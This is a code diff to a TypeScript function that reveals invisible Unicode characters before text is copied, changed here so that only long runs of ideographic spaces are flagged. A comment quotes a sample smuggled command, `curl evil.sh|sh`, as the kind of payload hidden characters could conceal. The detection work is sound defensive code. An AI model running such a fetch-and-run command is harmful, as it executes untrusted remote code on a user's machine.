@@ -5,7 +5,7 @@
 // `true; curl evil.sh|sh;# `, so a block shown before it is copied writes each one out as `<U+XXXX>`.
 //
 // Decided by Unicode property rather than a list of ranges, which missed whole classes. Left alone:
-// space, tab, newline, CRLF, the ideographic space, and the joiner and selector inside an emoji (`❤️`, a ZWJ family), which a
+// space, tab, newline, CRLF, an ideographic space or two, and the joiner and selector inside an emoji (`❤️`, a ZWJ family), which a
 // text box draws as the emoji — flagging those would make the warning cry wolf on ordinary text.
 //
 // Pure: text in, the text with each one written out and how many there were out.
@@ -15,9 +15,12 @@
 const INVISIBLE = /[\p{Cc}\p{Cf}\p{Cn}\p{Zs}\p{Zl}\p{Zp}\p{Co}\p{Default_Ignorable_Code_Point}\u2800\uFFFC]/u;
 const PICTOGRAPHIC = /[\p{Extended_Pictographic}\p{Emoji_Modifier}]/u;
 const KEYCAP_BASE = /[0-9#*]/;
-// Space; tab and newline; and the ideographic space, which breaks a line like a space does, so a
-// run of it cannot push anything out of view (and it is in every other Japanese sentence).
-const DRAWN_AS_ITSELF = new Set([" ", "\t", "\n", "\u3000"]);
+const DRAWN_AS_ITSELF = new Set([" ", "\t", "\n"]);
+// The ideographic space is in every other Japanese sentence, one or two at a time — but Safari wraps a
+// long run of it as blank lines, which pushes what follows out of view. So only a run longer than
+// Japanese text uses is flagged.
+const IDEOGRAPHIC_SPACE = "\u3000";
+const MAX_IDEOGRAPHIC_SPACES = 2;
 const PRESENTATION_SELECTORS = new Set(["\uFE0E", "\uFE0F"]);
 const ZERO_WIDTH_JOINER = "\u200D";
 
@@ -32,9 +35,22 @@ function isPartOfEmoji(characters: string[], index: number): boolean {
   return PICTOGRAPHIC.test(base) && PICTOGRAPHIC.test(characters[index + 1] ?? "");
 }
 
-function isHiddenAt(characters: string[], index: number): boolean {
+/** The positions of ideographic spaces in a run longer than prose uses. */
+function longIdeographicRuns(characters: string[]): Set<number> {
+  const runs = characters.reduce<number[][]>((found, character, index) => {
+    if (character !== IDEOGRAPHIC_SPACE) return found;
+    const current = found.at(-1);
+    if (current && current.at(-1) === index - 1) current.push(index);
+    else found.push([index]);
+    return found;
+  }, []);
+  return new Set(runs.filter((run) => run.length > MAX_IDEOGRAPHIC_SPACES).flat());
+}
+
+function isHiddenAt(characters: string[], index: number, longRuns: Set<number>): boolean {
   const character = characters[index] ?? "";
   if (DRAWN_AS_ITSELF.has(character)) return false;
+  if (character === IDEOGRAPHIC_SPACE) return longRuns.has(index);
   // A CR alone is drawn as a line break but pasted as Enter; in CRLF it is part of the line ending.
   if (character === "\r") return characters[index + 1] !== "\n";
   return INVISIBLE.test(character) && !isPartOfEmoji(characters, index);
@@ -50,7 +66,8 @@ export interface RevealedText {
 
 export function revealHidden(text: string): RevealedText {
   const characters = [...text];
-  const hiddenAt = characters.map((_, index) => isHiddenAt(characters, index));
+  const longRuns = longIdeographicRuns(characters);
+  const hiddenAt = characters.map((_, index) => isHiddenAt(characters, index, longRuns));
   return {
     shown: characters.map((character, index) => (hiddenAt[index] ? marker(character) : character)).join(""),
     hidden: hiddenAt.filter(Boolean).length,
